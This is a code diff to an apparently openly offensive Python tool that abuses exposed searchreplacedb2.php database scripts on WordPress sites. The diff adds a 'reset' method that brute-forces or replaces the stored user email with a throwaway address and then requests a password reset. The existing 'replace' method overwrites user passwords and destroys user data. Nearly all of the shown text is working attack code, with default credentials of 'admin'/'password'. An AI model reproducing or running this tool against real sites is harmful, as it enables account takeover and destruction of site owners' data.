@@ -6,16 +6,13 @@ import hashlib
 
 class Target(object):
 	"""The target to overwrite"""
-	def __init__(self, url, user,password):
-		self.ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./"
+	def __init__(self, url):
+		self.ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./-_"
 		self.ALPHABET = list(self.ALPHABET)
 		self.ALPHABET.append("$1$")
 		self.ALPHABET.append("10")
+		self.iterations = 15
 		self.url = self.sanitizeUrl(url)
-		self.user = user
-		self.password = password
-		self.PASSWORD_HASH = hashlib.md5(self.password).hexdigest()
-
 
 	def replace(self,search,replace):
 		values = {'host':self.db_host,
@@ -37,16 +34,72 @@ class Target(object):
 	def attack_sequence(self,method):
 
 		if method == "replace":
+			self.PASSWORD_HASH = hashlib.md5(self.password).hexdigest()
 			Target.info("Most user data (including current password and email) will be \x1B[91mdestroyed\x1B[0m")
 			Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
 			try:
 				time.sleep(10)
 			except:
-				Target.bad("\nUser stopped attack. Leaving...")
+				Target.bad("User stopped attack. Leaving...")
 				exit(0)
 			self.keep_user()
 			self.attack_password()
 			self.place_user()
+
+		elif method == "reset":
+			Target.good("Getting a new email")
+			#### Get online throwaway
+			self.throwaway = "throwaway@fake-email.com"
+			self.throwaway_url = "http://fake-email-generator.com/throwaway"
+			if not hasattr(self,"email"):
+				self.bruteforce_email()
+			else:
+				self.replace_email()
+
+	def bruteforce_email(self):
+		Target.info("Current emails will be \x1B[91mdestroyed\x1B[0m")
+		Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
+		try:
+			time.sleep(10)
+		except:
+			Target.bad("User stopped attack. Leaving...")
+			exit(0)
+
+		Target.good("Starting with "+str(self.iterations)+" iterations for domain")
+
+		for x in self.ALPHABET:
+			self.replace("@"+x,'@$')
+
+		for x in range(0,self.iterations):
+			Target.info(str(x+1)+"/"+str(self.iterations)+" on domain")
+			for x in self.ALPHABET:
+				self.replace("@$"+x,'@$')
+
+		for x in self.ALPHABET:
+			self.replace(x+"@",'$@')
+
+		for x in range(0,self.iterations):
+			Target.info(str(x+1)+"/"+str(self.iterations)+" on prefix")
+			for x in self.ALPHABET:
+				self.replace(x+"$@",'$@')
+
+		Target.good("Placing '"+self.throwaway+"' as address")
+		self.replace("$@$",self.throwaway)
+
+
+	def replace_email(self):
+		Target.good("Replacing "+self.email+" with "+self.throwaway)
+		### Replace original email with the one we control
+		self.replace(self.email,self.throwaway)
+
+		Target.good("Asking for password reset")
+		### Request a password reset on our throwaway email
+
+		#Target.good("Look for a reset message at "+throwaway_url)
+
+		#Target.good("Putting original email back ...")
+		#self.replace(self.throwaway,self.email)
+
 
 	def attack_password(self):
 		Target.good("Spraying wp-tables")
@@ -123,6 +176,8 @@ class Target(object):
 
 def main():
 	known_methods = ["reset","replace"]
+	user = False
+	password = False
 
 	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -m <method> -t <target_url> [-u -p -e]\n\n"+sys.argv[0]+" --help (for detailed help)\n~Mixbo (https://github.com/mixbo)")
 	parser.add_option('-t',dest='target_url',type='string',help="The target's URL (ex: http://www.exemple.com/searchreplacedb2.php)")
@@ -149,21 +204,27 @@ def main():
 
 	Target.good("Creating a login pair for \x1B[32m"+url+"\x1B[0m")
 	
-	if options.target_user:
-		user = options.target_user
-	else:
-		Target.info("Using 'admin' because no user was provided")
-		user = "admin"
+	if method == "replace":
+		if options.target_user:
+			user = options.target_user
+		else:
+			Target.info("Using 'admin' because no user was provided")
+			user = "admin"
 
-	if options.target_password:
-		password = options.target_password
-	else:
-		Target.info("Using 'password' because no password was provided")
-		password = "password"
+		if options.target_password:
+			password = options.target_password
+		else:
+			Target.info("Using 'password' because no password was provided")
+			password = "password"
 
-	t = Target(url,user,password)
+
+	t = Target(url)
 	if options.target_email:
 		t.email = options.target_email
+	if user:
+		t.user = user
+	if password:
+		t.password = password
 	t.populate()
 	t.attack_sequence(method)
 
